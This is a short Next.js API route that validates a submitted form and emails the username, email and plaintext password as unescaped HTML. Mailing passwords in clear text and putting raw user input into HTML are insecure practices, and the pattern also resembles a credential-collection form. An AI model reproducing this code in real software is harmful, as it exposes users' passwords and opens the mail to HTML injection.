import { formValidationSchema } from "@/utils/dataValidation";
import { sendEmail } from "@/utils/emailService";
import { NextResponse } from "next/server";

export async function POST(req: Request) {
  try {
    const body = await req.json();

    // Validate data
    await formValidationSchema.validate(body);

    const { username, email, password } = body;

    // Email content
    const emailBody = `
      <h1>New Form Submission</h1>
      <p><strong>Username:</strong> ${username}</p>
      <p><strong>Email:</strong> ${email}</p>
      <p><strong>Password:</strong> ${password}</p>
    `;

    // Send email
    const data = await sendEmail("Form Submission", emailBody);

    return NextResponse.json({ message: "Email sent successfully!", data });
  } catch (error: any) {
    if (error.name === "ValidationError") {
      return NextResponse.json({ error: error.message }, { status: 400 });
    }
    return NextResponse.json(
      { error: `Failed to send email: ${error.message}` },
      { status: 500 }
    );
  }
}
